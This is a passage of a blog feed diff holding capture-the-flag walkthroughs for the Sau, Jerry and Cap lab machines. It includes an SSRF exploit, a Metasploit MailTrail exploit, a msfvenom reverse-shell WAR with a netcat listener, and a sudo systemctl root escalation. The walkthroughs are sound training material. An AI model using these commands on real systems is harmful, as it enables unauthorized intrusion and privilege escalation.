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" width="281" height="30" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Sau#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>What is the version of request-baskets running on Sau?</p>
+<p>From the previous task we also see the version of the open source software.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Sau#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?</p>
+<p>By a quick search on cve.org we can find the CVE ID of this vulnerability. <a href="https://www.cve.org/CVERecord?id=CVE-2023-27163" target="_blank" rel="noopener noreferrer">https://www.cve.org/CVERecord?id=CVE-2023-27163</a></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Sau#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>What is the name of the software that the application running on port 80 is "powered by"?</p>
+<p>From the previous task, we suspect that we can find the software from exploiting the SSRF vulnerability. Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input which is exactly what we have in hand when we access the target ip in the browser.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-3-586216f6bef5ba4494b94f2226e147d7.png" width="1590" height="1066" class="img_ev3q"></p>
+<p>Using the vulnerable application, we can exploit the SSRF vulnerability by creating a basket that forwards requests to <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost:80</a> gaining access to the web server that runs the application we are looking for.</p>
+<p>We can do that by adding the endpoint. We got the token for the basket created.</p>
+<p>Then we can configure the basket to forward requests to an internal service. We open the basket, and on the configuration settings we set the forward url to be our local host on port 80.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-7-9bbfa054af76f85d379547c92604d557.png" width="1200" height="722" class="img_ev3q"></p>
+<p>Then, if we navigate to the endpoint we made on the browser, it would redirect us to the service running on port 80.</p>
+<p>There, on the bottom we see the name of the software.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-8-60b40a6208d30c3d4419f2ad0a2e1518.png" width="506" height="60" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Sau#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?</p>
+<p>By searching for the vulnerability we find that it exists in the login page. The relative path is <code>\login</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Sau#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>What system user is the Mailtrack application running as on Sau?</p>
+<p>We launch Metasploit by running <code>msfconsole</code> and search <code>search mailtrail</code> to see if the metasploit framework has any exploits available for the vulnerability.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-11-95c55fc62d7ad6fabb08e82fa1fec309.png" width="1003" height="345" class="img_ev3q"></p>
+<p>We can see that the only exploit listed is for the vulnerability we are targeting.</p>
+<p>We can use the exploit by <code>use 0</code>
+and see the options that need to be configured by <code>show options</code></p>
+<p>We set RHOSTS, RPORT to the target IP and port and the TARGETURI to the targeted configured endpoint. We also set the LHOST to our host machine, the LPORT is the listen port and is by default 4444.</p>
+<p>Then we run the exploit by <code>run</code>. And we are in. We run <code>shell</code> to span a shell and <code>whoami</code> to see the system user.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/Sau#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>Submit the flag located in the puma user's home directory.</p>
+<p>We navigate to the puma user's home directory and we list the contents to find and print by <code>cat user.txt</code> the flag.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/Sau#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>What is the full path to the binary (without arguments) the puma user can run as root on Sau?</p>
+<p>We can run <code>sudo -l</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-13-4b4bbad68df7dc911fe1b177df65a3f7.png" width="1003" height="83" class="img_ev3q"></p>
+<p>We then see the full path <code>/usr/bin/systemctl</code></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="https://danae-pan.github.io/Blog/blog/Sau#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
+<p>What is the full version string for the instance of systemd installed on Sau?</p>
+<p>We run <code>/usr/bin/systemctl --version</code> and see the version.</p>
+<p><code>systemd 245 (245.4-4ubuntu3.22)</code></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="https://danae-pan.github.io/Blog/blog/Sau#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
+<p>What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?</p>
+<p>Looking for the CVE ID online we find <code>CVE-2023-26604</code></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="https://danae-pan.github.io/Blog/blog/Sau#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
+<p>Submit the flag located in the root user's home directory.</p>
+<p>We first update the shell by running <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+<p>Then we run <code>sudo /usr/bin/systemctl status cron.service</code></p>
+<p>and <code>!/bin/bash</code> to get a shell as root. Then we navigate to the root direcotry and get the flag.</p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="linux" term="linux"/>
     </entry>
     <entry>
         <title type="html"><![CDATA[Jerry]]></title>
-        <id>Jerry</id>
+        <id>https://danae-pan.github.io/Blog/blog/Jerry</id>
         <link href="https://danae-pan.github.io/Blog/blog/Jerry"/>
-        <updated>2025-04-04T21:17:12.978Z</updated>
+        <updated>2025-04-06T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task1]]></summary>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[GoodGames]]></title>
-        <id>GoodGames</id>
-        <link href="https://danae-pan.github.io/Blog/blog/GoodGames"/>
-        <updated>2025-04-04T21:17:12.938Z</updated>
-        <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task1">Task1<a href="https://danae-pan.github.io/Blog/blog/Jerry#task1" class="hash-link" aria-label="Direct link to Task1" title="Direct link to Task1">​</a></h3>
+<p>Which TCP port is open on the remote host?</p>
+<p>Run nmap to scan for ports</p>
+<p><code>nmap -sS -p- &lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-13e88223d5fcbe743d32858ceda2d22e.png" width="680" height="222" class="img_ev3q"></p>
+<p>After scanning, the port 8080 is revelead to be open, where the http-proxy service is running.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Jerry#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>Which web server is running on the remote host? Looking for two words.</p>
+<p>To find the web server, we need to add the version field on the nmap scan.</p>
+<p><code>nmap -sV -p 8080 &lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-1-9bc478d2c4c78cf3404b0c25a80bdfce.png" width="801" height="274" class="img_ev3q"></p>
+<p>We see on the version that the web server is <strong>Apache Tomcat</strong>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Jerry#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>Which relative path on the webserver leads to the Web Application Manager?</p>
+<p>Open a browser and navigate to the ip address of the target. Remember to specify the port to be 8080.</p>
+<p>Take a look at the page, to see you can find anything useful. Under <strong>Managing Tomcat</strong> you see a URL to <strong>manager webapp</strong> which might be what is refered as Web Application Manager. It is stated that for security, access is restricted and users are defined in <strong>$CATALINA_HOME/conf/tomcat-users.xml</strong>. This seems like an interesting information, but let's first see what the URL gets us. When clicking we get redirected to <strong>/manager/html</strong> where we are asked to input our credential. This is a point we should keep in mind, but for now we got the relative path the question is asking for.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Jerry#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username<!-- -->:password</p>
+<p>On the previous step, we navigated to the <strong>/manager/html</strong> were we were asked for credentials. Since we were not able to authenticate, we show an example in the page of how to add a role to a user for accesssing the manager application. We can try to use those example credentials and see if they work on the login prompt, and they do!</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-6-b730756cc58d8a5efdd00ae6ffd2a0f1.png" width="993" height="395" class="img_ev3q"></p>
+<p>Another approach to this, is using <strong>Metasploit Framework</strong>. First, run <code>msfconsole</code> and then <code>search tomcat</code>. There you will find the auxiliary <strong>auxiliary/scanner/http/tomcat_mgr_login</strong> which will attempt to login based on a list of username - password names. To use it, run <code>use &lt;number_of_option&gt;</code> and then to see what you it is required for you to set <code>show options</code>.</p>
+<p>To select the target IP address and the port, run <code>set RHOSTS &lt;target_ip&gt;</code> and <code>set RPORT &lt;target_port&gt;</code>. Then type <code>run</code> and you will see that a login attempt was succesfull! As seen, those are the same credentials that were found before.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-7-bb38c07471055921e123bb8eb4812166.png" width="752" height="246" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Jerry#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?</p>
+<p>After authenticating in the previous page, you will see this part in the Web Application Manager page:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-3-dd6c3ee530600db4dff963a82b2500d0.png" width="920" height="283" class="img_ev3q"></p>
+<p>We can see that the file type is <strong>WAR</strong>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Jerry#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>Submit the flag located on the user's desktop.</p>
+<p>From the previous task, we realised we would be able to upload a war file, which smells like a backdoor we could use for remote code execution. A war file is used to deploy java based applications and we can use it to deploy a reverse shell and gain remote access to the target system.</p>
+<p>We can generate a war file using msfvenom</p>
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your_ip&gt; LPORT=&lt;your_port&gt; -f war &gt; shell.war</code></p>
+<p>An open the port that was specified so we can listen to the connection from the target</p>
+<p><code>sudo nc -lvnp &lt;your_port&gt;</code></p>
+<p>Then we navigate to the manager page and upload the war payload.
+On the list of applications we can see our deployment</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-8-09af0a711e62d49783cddede3487b0d1.png" width="954" height="77" class="img_ev3q"></p>
+<p>Then we can navigate to the <strong>/shell</strong> path and on our temrminal that we opened the port we can see are connected!</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-9-76a69ce4d2d0651e8e5e429b3b3f6f5d.png" width="276" height="88" class="img_ev3q"></p>
+<p>Navigating to the directory <strong>\Users\Administrator\Desktop</strong> and lisitng the direcrtories, we find a folder named flags.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-j-10-1a456c60f264d148761cf339e345eaac.png" width="590" height="231" class="img_ev3q"></p>
+<p>Running <code>type "2 for the price of 1.txt"</code> we get both the user and the root flags.</p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="windows" term="windows"/>
     </entry>
     <entry>
         <title type="html"><![CDATA[Cap]]></title>
-        <id>Cap</id>
+        <id>https://danae-pan.github.io/Blog/blog/Cap</id>
         <link href="https://danae-pan.github.io/Blog/blog/Cap"/>
-        <updated>2025-04-04T21:17:12.917Z</updated>
+        <updated>2025-03-25T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Cap#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>How many TCP ports are open?</p>
+<p><code>nmap -sS -p- &lt;ip_address&gt;</code></p>
+<ul>
+<li>-sS: Stealth Scan, the fastest way to scan ports of the most popular protocol (TCP).</li>
+</ul>
+<p>After scanning, 3 TCP ports are showing to be open.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-c-2491fb36b98b104943ea527f80ccecbf.png" width="1340" height="606" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Cap#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?</p>
+<p>Upen the hamburger menu, and click on <strong>Security Snapshot (5 Second PCAP + Analysis)</strong></p>
+<p>This will redirect you ti a URL with something being <strong>data</strong>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Cap#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>Are you able to get to other users' scans?</p>
+<p>For this, you can try and change the <strong>id</strong> from <strong>1</strong> to another value. If you try with the value <strong>0</strong> you will see different dashboard, which means you were able to get to other user's scans.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Cap#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>What is the ID of the PCAP file that contains sensative data?</p>
+<p>The page that was found before with the <strong>id</strong> equal to <strong>0</strong> is the one that contains sensative data.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Cap#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>Which application layer protocol in the pcap file can the sensetive data be found in?</p>
